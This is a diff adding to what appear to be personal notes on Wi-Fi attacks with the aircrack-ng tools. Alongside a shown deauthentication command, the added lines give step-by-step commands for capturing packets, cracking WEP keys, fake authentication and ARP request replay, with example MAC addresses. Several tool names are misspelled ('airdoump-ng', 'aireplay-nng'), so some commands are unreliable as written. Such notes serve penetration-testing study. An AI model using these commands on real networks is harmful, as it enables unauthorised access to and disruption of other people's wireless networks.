@@ -48,3 +48,48 @@ DEAUTHENTICATION ATTACK (Deauthenticate any Client)
 ---------------------------------------------------
 aireplay-ng --deauth [Deauthpackets] -a [NetworkMAC] -c [Target Mac] [interface]
 eg: aireplay-ng --deauth 100000 -a AC:37:28:6A:3F:49 -c FA:76:1D:C8:AF:4A wlan0
+
+GAINING ACCESS 
+---------------
+WEP CRACKING (Wired Equivalent Privacy)
+---------------------------------------
+capture a large number of packets/IVs -> using airodump-ng
+analyse the captures IVs and crack the key -> using aircrack-ng
+
+airodump-ng:
+=============
+fmt :airodump-ng --bssid [bssid of router/Network] --channel [channel netork running] --write [filename] [interface
+eg  :airdoump-ng --bssid AC:37:28:6A:3F:49  --channel 11 --write sample wlan0
+
+airdcrack-ng: 
+=============
+(if network is busy)
+
+fmt : aircrack-ng [file captured using airodump-ng(.cap)]
+eg  : aircrack-ng sample-01.cap
+
+password_key == key.replace(":","")
+eg : key = 41:73:32:33:70
+    password_key = 4173323370
+
+Fake authentication (if network is not busy)
+=======================
+if network is not busy,it would take time to capture enough IVs
+solution is that we need to force the AP to generate new IV
+
+
+fmt : aireplay-ng --fakeauth 0 -a [target network mac] -h [mac address of my wifi adaptor] [interface]
+eg  : aireplay-ng --fakeauth 0 -a AC:37:28:6A:3F:49 -h 48:5d:60:2A:45:25 wlan0
+
+(a new client with our mac address will be shownin the network, and AUTH will be changed to OPN)
+(right now we are associated with target network and if we sent anything its going to accept it and gonna communicate with us)
+
+ARP REQUEST REPLAY
+==================
+
+fmt : aireplay-nng --arpreplay -b [target network mac] -h [mac address of my wifi adaptor] [interface]
+eg  : aireplay-nng --arpreplay -b AC:37:28:6A:3F:49 -h 48:5d:60:2A:45:25 wlan0
+
+
+
+
